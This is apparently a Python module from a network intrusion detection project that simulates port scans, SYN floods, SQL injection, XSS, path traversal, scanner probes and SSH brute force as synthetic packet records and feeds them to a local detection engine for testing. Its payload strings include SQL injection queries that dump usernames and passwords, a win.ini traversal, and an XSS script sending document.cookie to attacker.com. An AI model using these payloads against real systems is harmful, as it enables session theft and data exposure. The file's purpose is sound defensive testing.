"""
NetSentinel - Cyber Attack Simulator & Synthetic Traffic Generator
Simulates various network cyberattacks and benign background traffic to test detection engines.
"""

import os
import sys

detector_dir = os.path.dirname(os.path.abspath(__file__))
if detector_dir not in sys.path:
    sys.path.insert(0, detector_dir)

import time
import random
import threading
from typing import List, Optional
from engine import global_engine, PacketRecord


# Simulated attacker IPs
ATTACKER_IPS = [
    "192.168.1.105",
    "10.0.0.45",
    "172.16.5.99",
    "198.51.100.14",
    "203.0.113.88",
    "192.0.2.156"
]

BENIGN_IPS = [
    "192.168.1.20",
    "192.168.1.25",
    "192.168.1.30",
    "10.0.0.15",
    "10.0.0.18"
]

TARGET_SERVER = "192.168.1.10"


class AttackSimulator:
    def __init__(self, engine=global_engine):
        self.engine = engine
        self._background_thread: Optional[threading.Thread] = None
        self._stop_event = threading.Event()

    def simulate_port_scan(self, attacker_ip: Optional[str] = None, port_count: int = 10) -> int:
        """Simulate a reconnaissance port scan (SYN scan pattern)."""
        ip = attacker_ip or random.choice(ATTACKER_IPS)
        ports_to_probe = [21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 445, 1433, 3306, 3389, 8080]
        selected_ports = random.sample(ports_to_probe, min(port_count, len(ports_to_probe)))

        print(f"[*] Simulating Port Scan from {ip} across {len(selected_ports)} ports...")
        detected_count = 0
        src_port = random.randint(40000, 65000)

        for port in selected_ports:
            pkt = PacketRecord(
                src_ip=ip,
                src_port=src_port,
                dst_ip=TARGET_SERVER,
                dst_port=port,
                protocol="TCP",
                length=64,
                payload=b"",
                flags="SYN"
            )
            res = self.engine.process_packet(pkt)
            if res:
                detected_count += 1
            time.sleep(0.04)  # Fast port scan

        return detected_count

    def simulate_dos_flood(self, attacker_ip: Optional[str] = None, packet_count: int = 40) -> int:
        """Simulate a high-rate SYN flood / DoS attack."""
        ip = attacker_ip or random.choice(ATTACKER_IPS)
        print(f"[*] Simulating DoS SYN Flood from {ip} ({packet_count} packets)...")
        detected_count = 0

        for _ in range(packet_count):
            pkt = PacketRecord(
                src_ip=ip,
                src_port=random.randint(1024, 65535),
                dst_ip=TARGET_SERVER,
                dst_port=80,
                protocol="TCP",
                length= random.randint(54, 120),
                payload=b"\x00" * 32,
                flags="SYN"
            )
            res = self.engine.process_packet(pkt)
            if res:
                detected_count += 1
            time.sleep(0.01)

        return detected_count

    def simulate_sqli_attack(self, attacker_ip: Optional[str] = None) -> int:
        """Simulate SQL Injection payloads in HTTP GET/POST traffic."""
        ip = attacker_ip or random.choice(ATTACKER_IPS)
        sqli_payloads = [
            b"GET /api/login?user=admin' OR '1'='1'--&pass=x HTTP/1.1\r\nHost: target\r\n\r\n",
            b"GET /products?id=1 UNION SELECT null,username,password FROM users-- HTTP/1.1\r\nHost: target\r\n\r\n",
            b"POST /search HTTP/1.1\r\nHost: target\r\n\r\nquery=item'; WAITFOR DELAY '0:0:5'--"
        ]
        payload = random.choice(sqli_payloads)
        print(f"[*] Simulating SQL Injection from {ip}...")

        pkt = PacketRecord(
            src_ip=ip,
            src_port=random.randint(40000, 65000),
            dst_ip=TARGET_SERVER,
            dst_port=80,
            protocol="HTTP",
            length=len(payload),
            payload=payload,
            flags="PA"
        )
        res = self.engine.process_packet(pkt)
        return 1 if res else 0

    def simulate_xss_attack(self, attacker_ip: Optional[str] = None) -> int:
        """Simulate Cross-Site Scripting (XSS) payload."""
        ip = attacker_ip or random.choice(ATTACKER_IPS)
        xss_payloads = [
            b"POST /comments HTTP/1.1\r\nHost: target\r\n\r\ncomment=<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
            b"GET /profile?name=<img src=x onerror=alert('NetSentinel_XSS')> HTTP/1.1\r\nHost: target\r\n\r\n"
        ]
        payload = random.choice(xss_payloads)
        print(f"[*] Simulating Cross-Site Scripting (XSS) from {ip}...")

        pkt = PacketRecord(
            src_ip=ip,
            src_port=random.randint(40000, 65000),
            dst_ip=TARGET_SERVER,
            dst_port=8080,
            protocol="HTTP",
            length=len(payload),
            payload=payload,
            flags="PA"
        )
        res = self.engine.process_packet(pkt)
        return 1 if res else 0

    def simulate_path_traversal(self, attacker_ip: Optional[str] = None) -> int:
        """Simulate Directory / Path Traversal exploit."""
        ip = attacker_ip or random.choice(ATTACKER_IPS)
        payload = b"GET /download?file=../../../../windows/win.ini HTTP/1.1\r\nHost: target\r\n\r\n"
        print(f"[*] Simulating Path Traversal from {ip}...")

        pkt = PacketRecord(
            src_ip=ip,
            src_port=random.randint(40000, 65000),
            dst_ip=TARGET_SERVER,
            dst_port=80,
            protocol="HTTP",
            length=len(payload),
            payload=payload,
            flags="PA"
        )
        res = self.engine.process_packet(pkt)
        return 1 if res else 0

    def simulate_scanner_recon(self, attacker_ip: Optional[str] = None) -> int:
        """Simulate automated scanner reconnaissance (sqlmap / nikto User-Agent)."""
        ip = attacker_ip or random.choice(ATTACKER_IPS)
        payload = b"GET /test.php HTTP/1.1\r\nHost: target\r\nUser-Agent: sqlmap/1.6#stable (https://sqlmap.org)\r\n\r\n"
        print(f"[*] Simulating Automated Scanner Probing from {ip}...")

        pkt = PacketRecord(
            src_ip=ip,
            src_port=random.randint(40000, 65000),
            dst_ip=TARGET_SERVER,
            dst_port=80,
            protocol="HTTP",
            length=len(payload),
            payload=payload,
            flags="PA"
        )
        res = self.engine.process_packet(pkt)
        return 1 if res else 0

    def simulate_brute_force(self, attacker_ip: Optional[str] = None) -> int:
        """Simulate SSH/FTP Brute Force credential cracking."""
        ip = attacker_ip or random.choice(ATTACKER_IPS)
        print(f"[*] Simulating SSH Brute Force from {ip}...")
        detected = 0

        for _ in range(6):
            pkt = PacketRecord(
                src_ip=ip,
                src_port=random.randint(40000, 65000),
                dst_ip=TARGET_SERVER,
                dst_port=22,
                protocol="SSH",
                length=128,
                payload=b"SSH-2.0-OpenSSH_8.2p1\r\nFailed password for root",
                flags="PA"
            )
            res = self.engine.process_packet(pkt)
            if res:
                detected += 1
            time.sleep(0.05)

        return detected

    def send_benign_packet(self):
        """Send normal web, DNS, or TLS traffic (benign)."""
        ip = random.choice(BENIGN_IPS)
        normal_ports = [80, 443, 53]
        port = random.choice(normal_ports)
        proto = "DNS" if port == 53 else "HTTPS" if port == 443 else "HTTP"
        payload = b"GET /index.html HTTP/1.1\r\nHost: example.local\r\nUser-Agent: Mozilla/5.0 Chrome/120\r\n\r\n"

        pkt = PacketRecord(
            src_ip=ip,
            src_port=random.randint(30000, 60000),
            dst_ip=TARGET_SERVER,
            dst_port=port,
            protocol=proto,
            length=random.randint(80, 500),
            payload=payload,
            flags="A"
        )
        self.engine.process_packet(pkt)

    def start_background_traffic(self, interval: float = 1.0):
        """Continuously generate light benign background traffic."""
        if self._background_thread and self._background_thread.is_alive():
            return

        self._stop_event.clear()

        def _worker():
            while not self._stop_event.is_set():
                self.send_benign_packet()
                time.sleep(interval)

        self._background_thread = threading.Thread(target=_worker, daemon=True)
        self._background_thread.start()

    def stop_background_traffic(self):
        self._stop_event.set()


global_simulator = AttackSimulator()

if __name__ == "__main__":
    print("Testing Attack Simulator directly...")
    global_simulator.simulate_port_scan()
    global_simulator.simulate_dos_flood()
    global_simulator.simulate_sqli_attack()
    global_simulator.simulate_xss_attack()
    global_simulator.simulate_brute_force()
    print("All simulations finished. Alert stats:", global_engine.get_stats())
